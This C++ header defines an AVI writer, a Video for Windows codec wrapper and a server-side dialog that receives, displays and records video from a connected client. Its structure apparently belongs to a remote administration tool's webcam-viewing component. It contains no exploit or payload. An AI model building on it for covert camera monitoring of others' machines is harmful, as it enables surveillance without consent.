#pragma once

#include "IOCPServer.h"


#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

/************************************************************************
* @class CBmpToAvi
* @brief 位图转AVI帧
************************************************************************/
class CBmpToAvi
{
public:
	CBmpToAvi();
	virtual ~CBmpToAvi();
	bool Open(LPCTSTR szFile, LPBITMAPINFO lpbmi);
	bool Write(LPVOID lpBuffer);
	void Close();
private:
	PAVIFILE m_pfile;
	PAVISTREAM m_pavi;
	int m_nFrames;
	static AVISTREAMINFO m_si; // 这个参数需要是静态的
};

class CVideoCodec  
{
	COMPVARS	m_cv;
	HIC			m_hIC;
	BITMAPINFO*	m_lpbmiInput;
	BITMAPINFO	m_bmiOutput;
public:

	bool InitCompressor(BITMAPINFO*	lpbmi, DWORD fccHandler)
	{
		if (lpbmi == NULL)
			return false;

		m_lpbmiInput = lpbmi;

		ZeroMemory(&m_cv, sizeof(m_cv));
		m_cv.cbSize		= sizeof(m_cv);
		m_cv.dwFlags	= ICMF_COMPVARS_VALID;
		m_cv.hic		= m_hIC;
		m_cv.fccType	= ICTYPE_VIDEO;
		m_cv.fccHandler	= fccHandler;
		m_cv.lpbiOut	= NULL;
		m_cv.lKey		= 10;
		m_cv.lDataRate	= 6;
		m_cv.lQ			= ICQUALITY_HIGH;		

		m_hIC = ICOpen(ICTYPE_VIDEO, m_cv.fccHandler, ICMODE_COMPRESS | ICMODE_DECOMPRESS);

		if (m_hIC == NULL)
		{
			return false;
		}

		ICCompressGetFormat(m_hIC, m_lpbmiInput, &m_bmiOutput);
		// 向编码器发送验证
		ICSendMessage(m_hIC, 0x60c9, 0xf7329ace, 0xacdeaea2);

		m_cv.hic = m_hIC;
		m_cv.dwFlags = ICMF_COMPVARS_VALID;

		if (!ICSeqCompressFrameStart(&m_cv, m_lpbmiInput))
		{
			return false;
		}

		ICDecompressBegin(m_hIC, &m_bmiOutput , m_lpbmiInput);

		return true;
	}

	bool DecodeVideoData(BYTE *pin, int len, BYTE* pout, int *lenr,DWORD flag)
	{
		if(!pin || !pout ||!m_hIC)		
			return false;
		if (ICDecompress(m_hIC, flag, &m_bmiOutput.bmiHeader, pin, &m_lpbmiInput->bmiHeader, pout) != ICERR_OK)
			return false;

		if (lenr) *lenr = m_lpbmiInput->bmiHeader.biSizeImage;

		return true;	
	}

	bool EncodeVideoData(BYTE* pin, int len, BYTE* pout, int* lenr, bool* pKey)
	{
		BYTE	*p;
		long	s = 1;
		BOOL	k = true;
		if ( !pin || !pout || len != (int)m_lpbmiInput->bmiHeader.biSizeImage || !m_hIC)
			return false;
		p = (BYTE*)ICSeqCompressFrame(&m_cv, 0, pin, &k, &s);

		if (!p)		return false;
		if (lenr)	*lenr = s;
		if (pKey)	*pKey = k;

		CopyMemory(pout, p, s);

		return true;
	}

	CVideoCodec()
	{
		m_lpbmiInput = NULL;
	}

	virtual ~CVideoCodec()
	{
		// No init yet or init error
		if (m_hIC == NULL)
			return;
		ICDecompressEnd(m_hIC);
		ICSeqCompressFrameEnd(&m_cv);
		ICCompressorFree(&m_cv);
		ICClose(m_hIC);
	}
	int MyEnumCodecs(int *fccHandler, char *strName)
	{
		static int	i = 0;
		int			nRet = 1;
		HIC			hIC;
		ICINFO		icInfo;

		if (fccHandler == NULL)
			return 0;

		if(!ICInfo(ICTYPE_VIDEO, i, &icInfo)) 
		{
			i = 0;
			return 0;
		}
		hIC = ICOpen(icInfo.fccType, icInfo.fccHandler, ICMODE_QUERY);

		if (hIC)
		{
			ICGetInfo(hIC, &icInfo, sizeof(icInfo)); 
			*fccHandler = icInfo.fccHandler;
			//由于得到的szDescription是UNICODE双字节字串，所以要转换为ASCII的
			if (strName != NULL)
				wcstombs(strName, icInfo.szDescription, 256);
		}
		else nRet = -1;

		ICClose(hIC);
		i++;
		return nRet;
	}
};


// CVideoDlg 对话框

class CVideoDlg : public CDialog
{
	DECLARE_DYNAMIC(CVideoDlg)
	HICON m_hIcon;

public:
	CVideoDlg(CWnd* pParent = NULL, IOCPServer* IOCPServer = NULL, CONTEXT_OBJECT *ContextObject = NULL);   // 标准构造函数
	virtual ~CVideoDlg();
	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer*     m_iocpServer;
	CString    m_strIPAddress;

	LPBITMAPINFO m_BitmapInfor_Full;
	BYTE*        m_BitmapData_Full;
	BYTE*        m_BitmapCompressedData_Full;
	void ResetScreen(void);
	void OnReceiveComplete(void);
	void DrawDIB(void);

	void SaveAvi(void);
	void InitCodec(DWORD fccHandler);

	CString		m_aviFile; // 如果文件名不为空就写入
	CBmpToAvi	m_aviStream;

	int			m_nCount;
	HDC			m_hDC;
	HDRAWDIB	m_hDD;

	CVideoCodec	*m_pVideoCodec;   // 视频压缩类
	// 对话框数据
	enum { IDD = IDD_DIALOG_VIDEO };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
};
